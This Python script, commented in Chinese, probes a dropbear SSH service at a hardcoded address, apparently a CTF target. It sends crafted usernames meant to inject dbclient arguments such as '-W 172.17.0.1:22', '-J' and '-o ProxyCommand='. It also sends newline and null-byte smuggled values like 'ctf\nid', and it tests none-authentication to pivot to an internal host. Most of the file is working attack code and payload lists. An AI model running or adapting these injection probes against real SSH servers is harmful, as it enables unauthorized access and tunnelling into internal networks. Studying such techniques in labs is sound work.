#!/usr/bin/env python3
"""
探索dropbear将用户名解析为命令行参数的行为！

关键发现：
- mount, escape 等词触发连接关闭
- -v, --help, -ctf 等也触发连接关闭
- 这表明dropbear可能在解析用户名作为某种命令！

如果dropbear使用用户名作为内部SSH客户端的参数...
那么我们可能可以注入SSH参数！
"""

import paramiko
import socket
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

TARGET_HOST = "61.147.171.105"
TARGET_PORT = 55300
USERNAME = "ctf"
PASSWORD = "123456"

def test_username_raw(username, password="123456"):
    """测试用户名并捕获详细的响应"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # 读取banner
        banner = b""
        try:
            while True:
                data = sock.recv(1024)
                if not data:
                    break
                banner += data
                if b"\r\n" in banner or b"\n" in banner:
                    break
        except:
            pass
        
        if not banner:
            sock.close()
            return "no_banner", None
            
        # 发送我们的banner
        sock.send(b"SSH-2.0-paramiko_2.8.1\r\n")
        
        # 接收更多数据看看
        time.sleep(0.5)
        response = b""
        try:
            sock.setblocking(False)
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
        except:
            pass
        
        sock.close()
        return "banner_received", banner.decode(errors='replace')
        
    except Exception as e:
        return "error", str(e)

def test_username_ssh(username, password="123456"):
    """使用paramiko测试"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            TARGET_HOST, TARGET_PORT,
            username=username,
            password=password,
            timeout=5,
            allow_agent=False,
            look_for_keys=False
        )
        
        # 尝试执行命令
        stdin, stdout, stderr = client.exec_command("id", timeout=3)
        output = stdout.read().decode()
        error = stderr.read().decode()
        client.close()
        return "success", f"out={output}, err={error}"
        
    except paramiko.AuthenticationException as e:
        return "auth_failed", str(e)
    except paramiko.SSHException as e:
        return "ssh_error", str(e)
    except Exception as e:
        return "error", str(e)

print("=" * 70)
print("[*] 探索dropbear的用户名解析行为")
print("=" * 70)

# 如果dropbear把用户名传给内部SSH客户端...
# SSH客户端常见参数:
# -i identity_file  指定私钥
# -o option         SSH选项
# -J jump_host      跳板机
# -W host:port      stdio forwarding
# -N                不执行命令
# -T                不分配tty
# -v                详细模式
# -p port           端口

print("\n[*] 测试SSH客户端参数格式的用户名")
print("-" * 70)

ssh_arg_usernames = [
    # 基本参数
    "-v",
    "-vvv",
    "-V",
    "-h",
    "-?",
    
    # 目标指定
    "-l ctf",
    "-l ctf 172.17.0.1",
    "-p 22",
    "-p22",
    
    # ProxyJump相关 - dropbear支持 -J
    "-J localhost",
    "-J 172.17.0.1",
    "-J ctf@172.17.0.1",
    "-J ctf@localhost",
    
    # stdio forwarding - dropbear支持 -W (netcat mode)
    "-W 172.17.0.1:22",
    "-W localhost:22",
    "-W 172.17.0.1:80",
    "-W host:22",
    
    # 选项
    "-o ProxyCommand=",
    "-o StrictHostKeyChecking=no",
    
    # 组合
    "ctf -J 172.17.0.1",
    "ctf -W 172.17.0.1:22",
    
    # 特殊
    "-N",
    "-T",
    "-f",
    
    # 测试 -- 分隔符
    "-- ctf",
    "ctf --",
]

for username in ssh_arg_usernames:
    status, detail = test_username_ssh(username)
    if status == "success":
        print(f"[+] {username:40} => 成功! {detail}")
    elif status == "auth_failed":
        print(f"[-] {username:40} => 认证失败")
    elif "banner" in str(detail).lower() or "eof" in str(detail).lower():
        print(f"[!] {username:40} => 连接关闭")
    else:
        print(f"[?] {username:40} => {status}: {detail[:50]}")

print("\n" + "=" * 70)
print("[*] 深入测试 -W (netcat模式)")
print("=" * 70)
print("""
dropbear的 -W 选项是"netcat模式"：
  dbclient -W <host>:<port>
  连接后，stdin/stdout直接转发到目标的TCP连接

如果用户名被解析为dbclient参数...
使用 "-W 172.17.0.1:22" 可能会建立到真实主机的隧道！
""")

# 使用原始socket测试-W模式
print("\n[*] 使用原始socket测试 -W 选项")
print("-" * 70)

w_options = [
    "-W172.17.0.1:22",
    "-W 172.17.0.1:22", 
    "-W=172.17.0.1:22",
    "-W:172.17.0.1:22",
    "-Wlocalhost:22",
    "-W localhost:22",
]

for opt in w_options:
    status, detail = test_username_raw(opt)
    print(f"  {opt:30} => {status}")

print("\n" + "=" * 70)
print("[*] 测试特殊的dropbear dbclient选项")
print("=" * 70)

# dbclient特有选项
dbclient_options = [
    "-i",           # identity file
    "-y",           # always accept host key
    "-s",           # subsystem
    "-K",           # keepalive
    "-I",           # idle timeout
    "-B",           # endianness (internal)
    "-c",           # cipher
    "-m",           # mac
    "-b",           # local port
    "-R",           # remote forward
    "-L",           # local forward
    "-g",           # allow remote gateway
    "-k",           # no remote command
    "-t",           # pty
    "-T",           # no pty
    "-N",           # no shell
    "-f",           # background
    "-y",           # accept host key
    "-A",           # agent forwarding
]

for opt in dbclient_options:
    status, detail = test_username_ssh(opt)
    if "banner" in str(detail).lower() or "eof" in str(detail).lower():
        print(f"[!] {opt:30} => 连接关闭（被解析为参数?）")
    elif status == "auth_failed":
        print(f"[-] {opt:30} => 认证失败")
    else:
        print(f"[?] {opt:30} => {status}")

print("\n" + "=" * 70)
print("[*] 测试更复杂的组合")
print("=" * 70)

complex_usernames = [
    # 尝试通过-W建立隧道
    "-W172.17.0.1:22 ctf",
    "ctf -W172.17.0.1:22",
    
    # 尝试指定目标
    "ctf@-W172.17.0.1:22",
    "-W172.17.0.1:22@ctf",
    
    # 尝试用空格分隔
    "ctf 172.17.0.1",
    "172.17.0.1 ctf",
    
    # 端口指定
    "-p22 ctf@172.17.0.1",
    "ctf@172.17.0.1:22",
    "ctf@172.17.0.1 -p22",
    
    # 尝试绕过解析
    "'ctf'",
    "\"ctf\"",
    "ctf\x00extra",
    "ctf\nid",
    "ctf\r\nid",
]

for username in complex_usernames:
    try:
        status, detail = test_username_ssh(username)
        if status == "success":
            print(f"[+] {repr(username):40} => 成功! {detail}")
        elif status == "auth_failed":
            print(f"[-] {repr(username):40} => 认证失败") 
        elif "banner" in str(detail).lower() or "eof" in str(detail).lower():
            print(f"[!] {repr(username):40} => 连接关闭")
        else:
            print(f"[?] {repr(username):40} => {status}")
    except Exception as e:
        print(f"[!] {repr(username):40} => 异常: {e}")

print("\n" + "=" * 70)
print("[*] 思考：如何利用用户名解析")
print("=" * 70)
print("""
假设dropbear内部执行类似:
    dbclient -i /key <用户名>

如果我们的用户名是 "-W 172.17.0.1:22 dummy"
则命令变成:
    dbclient -i /key -W 172.17.0.1:22 dummy

这会建立到172.17.0.1:22的netcat隧道！

让我们测试这个假设...
""")

# 测试用户名是否能包含目标
print("\n[*] 测试将目标主机放在用户名中")
print("-" * 70)

target_in_username = [
    "172.17.0.1",
    "ctf 172.17.0.1",
    "172.17.0.1 ctf", 
    "ctf@172.17.0.1",
    "root@172.17.0.1",
    "ubuntu@172.17.0.1",
    "localhost",
    "ctf@localhost",
    # 使用-l指定用户
    "-l ctf 172.17.0.1",
    "-lctf 172.17.0.1",
    # 使用不同分隔符
    "ctf%h172.17.0.1",
    "ctf%%172.17.0.1",
]

for username in target_in_username:
    status, detail = test_username_ssh(username)
    if status == "success":
        print(f"[+] {username:40} => 成功!")
    elif status == "auth_failed":
        print(f"[-] {username:40} => 认证失败（转发触发?）")
    else:
        print(f"[!] {username:40} => {status}")

print("\n" + "=" * 70)
print("[*] 关键测试：使用不同的认证方式")
print("=" * 70)
print("""
提示说"第二次SSH连接的错误信息是有用的提示"

也许：
1. 第一次连接(我们到dropbear)使用ctf/123456
2. 第二次连接(dropbear到真实目标)需要不同的凭据

如果dropbear用自己的密钥连接真实目标...
我们需要让dropbear使用它自己的密钥！

可能需要:
- 使用publickey认证而不是password
- 或者触发agent forwarding
- 或者让dropbear忽略我们的密码，使用它自己的
""")

# 测试使用none认证
print("\n[*] 测试none认证（让dropbear用自己的凭据）")
print("-" * 70)

def test_none_auth(username):
    """测试none认证方式"""
    try:
        transport = paramiko.Transport((TARGET_HOST, TARGET_PORT))
        transport.connect()
        
        try:
            # 尝试none认证
            transport.auth_none(username)
            print(f"[+] {username}: none认证成功!")
            transport.close()
            return True
        except paramiko.BadAuthenticationType as e:
            print(f"[-] {username}: none不支持, 允许的: {e.allowed_types}")
        except paramiko.AuthenticationException as e:
            print(f"[-] {username}: 认证失败: {e}")
        except Exception as e:
            print(f"[?] {username}: {type(e).__name__}: {e}")
            
        transport.close()
        return False
        
    except Exception as e:
        print(f"[!] {username}: 连接错误: {e}")
        return False

for username in ["ctf", "ctf@172.17.0.1", "ctf@localhost", "root", "-W172.17.0.1:22"]:
    test_none_auth(username)

print("\n[*] 完成测试")
